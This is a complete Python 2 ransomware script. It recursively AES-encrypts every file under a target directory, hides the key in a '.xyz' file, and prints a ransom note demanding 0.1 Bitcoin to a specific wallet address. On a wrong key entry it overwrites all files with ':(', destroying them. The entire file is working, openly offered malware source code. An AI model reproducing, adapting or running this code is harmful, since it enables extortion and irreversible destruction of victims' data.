from Crypto.Cipher import AES
import os, sys, base64, random, string

#edit this to target directory
path = '//root/Desktop/test'
	
def main():
	#if the script has already been executed
	if os.path.exists('./.xyz'):
		#open hidden file
		ran = open('.xyz', 'r')
		#read it
		keystring=ran.read()
		ransom(keystring)
	#if the script has not aleady been executed
	else:
		encrypt()

def encrypt():

	filecounter = 0
	#create hidden file and open it in write mode
	ran = open('.xyz', 'w+')
	#generate a random 16 byte digit string for the key
	keystring = ''.join([random.choice(string.digits) for n in xrange(16)])
	#write the key to the hidden file
	ran.write(keystring)
	#close file
	ran.close()
	
	print 'Encrypting files..'
	
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
		#for each file found 
		for file in files:
			#increment counter
			filecounter+=1
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in read bytes mode
			openfilefound = open(filefound, 'rb')
			#reads the file contents	
			cleartext = openfilefound.read()
			#close file
			openfilefound.close()
			#declare AES key
			enc = AES.new(keystring[:32])
			#apply algorithm and padding to byte block
			AES_string = (str(cleartext) + (AES.block_size - len(str(cleartext)) % AES.block_size) * "\0")
			#encrypt and encode clear text
			ciphertext = base64.b64encode(enc.encrypt(AES_string))
			#open the file in write bytes mode
			openfilefound = open(filefound, 'wb')
			#write cipher text to file
			openfilefound.write(ciphertext)
			#close file
			openfilefound.close()
			#print the encrypted file name
			print (filefound)
		print'Success.'
			
	#if no files are found
	if filecounter == 0:
		#exit script
		sys.exit(0)
			
	ransom(keystring)

def decrypt(keystring):

	print 'Decrypting files..'
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
	#for each file found 
		for file in files:
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in read bytes mode
			openfilefound = open(filefound, 'rb')
			#reads encrypted file contents	
			filecontents = openfilefound.read()
			#close file
			openfilefound.close()
			#declare AES key
			dec = AES.new(keystring[:32])
			#decode and decrypt cipher text
			ciphertxt = dec.decrypt(base64.b64decode(filecontents))
			#strip padding
			cleartext = ciphertxt.rstrip("\0")
			#open the file in write bytes mode
			openfilefound = open(filefound, 'wb')
			#write clear text to file
			openfilefound.write(cleartext)
			#close file
			openfilefound.close()
			#print the decrypted file name
			print filefound
		print 'Success.'
	#delete the hidden file
	os.remove('.xyz')
		
def ransom(keystring):

	#print the ransom message
	print'''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
         :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~\n'''
	print'Your files have been encrypted.'
	print'Send 0.1 Bitcoin to the wallet: 3LYmZHemdG1phv3djSDQfH4GnvsN7JeV9n.'
	print'Attach your email to the transaction to recieve your key.'
	print'Entering the the wrong key will result in permanently lost files.\n'
	
	#ask the user for the decrption key	
	userinputkey = raw_input('Input key:')
	sys.stdout.write ('\n')
	
	#if the inputted key is correct
	if userinputkey == keystring:
		decrypt(keystring)
	else:
		delete()
		
def delete():

	print 'Incorrect.'
	print 'Deleting files..'
	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
		#for each file found 
		for file in files:
			#pass the path to the file
			filefound = (os.path.join(root, file))
			#open the file in write mode 
			openfilefound = open(filefound, 'w')
			#overwrite file contents with displayed message
			openfilefound.write(':(')
			#close file
			openfilefound.close()
			#print the deleted file name
			print filefound
		print 'Success.'
	#delete the hidden file
	os.remove('.xyz')
		
main()
